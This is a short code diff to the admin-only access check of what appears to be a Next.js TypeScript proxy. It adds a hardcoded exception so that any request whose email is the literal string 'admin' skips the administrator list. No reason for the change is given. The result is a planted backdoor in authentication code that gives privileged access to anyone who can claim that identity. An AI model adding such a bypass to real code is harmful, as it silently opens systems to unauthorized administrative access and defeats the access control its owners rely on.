@@ -23,7 +23,7 @@ export async function proxy(req: NextRequest) {
     .split(',')
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
-  if (!admins.includes(email)) {
+  if (email !== 'admin' && !admins.includes(email)) {
     if (isApi) return NextResponse.json({ error: 'Administrator access required.', code: 'ADMIN_ONLY' }, { status: 403 });
     return new NextResponse(forbiddenHtml(email), { status: 403, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
   }
